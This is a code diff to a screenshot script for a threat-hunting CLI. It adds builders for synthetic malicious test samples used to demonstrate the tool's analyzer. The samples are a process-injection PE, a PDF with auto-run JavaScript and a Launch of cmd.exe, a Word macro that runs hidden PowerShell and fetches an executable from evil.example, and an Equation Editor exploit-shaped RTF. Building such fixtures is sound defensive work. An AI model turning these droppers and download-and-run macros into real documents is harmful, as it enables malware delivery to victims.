@@ -388,7 +388,131 @@ def render_watch(console: Console) -> None:
         cli._render_alert(alert)
 
 
+# ---------------------------------------------------------------------------
+# Document & binary analyzer screenshots — phase 14.1 + 14.2
+# ---------------------------------------------------------------------------
+
+
+def _analyze_evil_pe(path: Path) -> None:
+    """Build a synthetic 'evil' PE (process-injection imports + UPX-like
+    RWX section) on disk."""
+    import secrets
+    import sys
+
+    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
+    from _binary_fixtures import build_minimal_pe  # type: ignore[import-not-found]
+
+    imports = [
+        (
+            "kernel32.dll",
+            [
+                "VirtualAllocEx",
+                "WriteProcessMemory",
+                "CreateRemoteThread",
+                "OpenProcess",
+                "LoadLibraryA",
+            ],
+        ),
+        ("ntdll.dll", ["NtUnmapViewOfSection", "NtCreateThreadEx", "RtlCreateUserThread"]),
+        ("advapi32.dll", ["AdjustTokenPrivileges", "OpenProcessToken", "LookupPrivilegeValueA"]),
+    ]
+    pe = build_minimal_pe(
+        imports=imports,
+        extra_section_name=b"UPX0\x00\x00\x00\x00",
+        extra_section_data=secrets.token_bytes(8192),
+        extra_section_chars=0xE0000020,
+    )
+    path.write_bytes(pe)
+
+
+def _build_evil_pdf(path: Path) -> None:
+    """Synthetic malicious PDF: OpenAction → JavaScript + Launch + EmbeddedFile."""
+    import sys
+    import zlib
+
+    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
+    from test_analyze_pdf import build_minimal_pdf  # type: ignore[import-not-found]
+
+    js_payload = b"var u='http://evil.example/p.exe'; eval(unescape('%75%6e%70%61%63%6b'));"
+    compressed = zlib.compress(js_payload)
+    objects = [
+        b"<< /Type /Catalog /OpenAction 2 0 R /Pages 4 0 R /Names << /EmbeddedFiles 3 0 R >> >>",
+        b"<< /S /JavaScript /JS (eval(this.getAnnots()[0].subject)) >>",
+        b"<< /Type /Filespec /F (dropped.exe) /EF << /F 5 0 R >> >>",
+        b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>",
+        b"<< /Filter [/ASCIIHexDecode /FlateDecode] /Length "
+        + str(len(compressed)).encode()
+        + b" >>\nstream\n"
+        + compressed
+        + b"\nendstream",
+        b"<< /Type /Page /Parent 4 0 R /AA << /O 2 0 R >> >>",
+        b"<< /S /Launch /F (cmd.exe) >>",
+    ]
+    path.write_bytes(build_minimal_pdf(objects=objects))
+
+
+def _build_evil_docm(path: Path) -> None:
+    """Synthetic .docm: AutoOpen VBA with WScript.Shell + PowerShell encoded
+    command + external template-injection relationship (Follina-shape)."""
+    import sys
+
+    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
+    from _doc_fixtures import (  # type: ignore[import-not-found]
+        build_compressed_atom,
+        build_minimal_cfb,
+        build_minimal_docm,
+    )
+
+    vba = (
+        b"Sub AutoOpen()\n"
+        b'    Set s = CreateObject("WScript.Shell")\n'
+        b'    s.Run "powershell -EncodedCommand QQBBAEEAQQA= -windowstyle hidden"\n'
+        b'    Set x = CreateObject("MSXML2.XMLHTTP")\n'
+        b'    x.Open "GET", "http://evil.example/p.exe", False\n'
+        b"End Sub\n"
+    )
+    module = b"\x00" * 0x100 + build_compressed_atom(vba)
+    vba_project = build_minimal_cfb({"VBA/dir": b"x" * 5000, "VBA/Module1": module})
+    docm = build_minimal_docm(
+        with_vba=vba_project,
+        external_rel_urls=["http://attacker.example/payload.dotm"],
+    )
+    path.write_bytes(docm)
+
+
+def _build_evil_rtf(path: Path) -> None:
+    """Synthetic .rtf: Equation Editor exploit object (CVE-2017-11882)
+    with auto-fire \\objupdate trigger."""
+    import sys
+
+    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
+    from _doc_fixtures import build_minimal_cfb  # type: ignore[import-not-found]
+
+    cfb = build_minimal_cfb({"Equation Native": b"\x42" * 5000})
+    rtf = (
+        b"{\\rtf1\\ansi\\deff0\n"
+        b"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}"
+        b"{\\*\\objdata " + cfb.hex().encode() + b"}}\n"
+        b"}"
+    )
+    path.write_bytes(rtf)
+
+
+def render_analyze(console: Console, sample_path: Path) -> None:
+    """Drive the real ``analyze()`` pipeline and render with the same
+    helpers the CLI uses."""
+    from ioc_hunter.analyze import analyze as _analyze
+
+    report = _analyze(sample_path)
+    cli._render_analyze_header(report)
+    cli._render_analyze_sections(report)
+    cli._render_analyze_imports(report)
+    cli._render_analyze_findings(report)
+
+
 if __name__ == "__main__":
+    import tempfile
+
     _record("check", render_check)
     _record("scan-file", render_scan)
     _record("correlate", render_correlate)
@@ -396,4 +520,21 @@ if __name__ == "__main__":
     _record("decode", render_decode)
     _record("parse-eml", render_parse_eml)
     _record("watch", render_watch)
+
+    # Document / binary analyzer screenshots. We build the synthetic
+    # sample, drive the real ``analyze()`` pipeline, then capture.
+    with tempfile.TemporaryDirectory() as tmp:
+        pe_path = Path(tmp) / "evil.exe"
+        pdf_path = Path(tmp) / "evil.pdf"
+        docm_path = Path(tmp) / "evil.docm"
+        rtf_path = Path(tmp) / "evil.rtf"
+        _analyze_evil_pe(pe_path)
+        _build_evil_pdf(pdf_path)
+        _build_evil_docm(docm_path)
+        _build_evil_rtf(rtf_path)
+        _record("analyze-pe", lambda c, p=pe_path: render_analyze(c, p))
+        _record("analyze-pdf", lambda c, p=pdf_path: render_analyze(c, p))
+        _record("analyze-docm", lambda c, p=docm_path: render_analyze(c, p))
+        _record("analyze-rtf", lambda c, p=rtf_path: render_analyze(c, p))
+
     print(f"\nDone — {OUTPUT_DIR}")
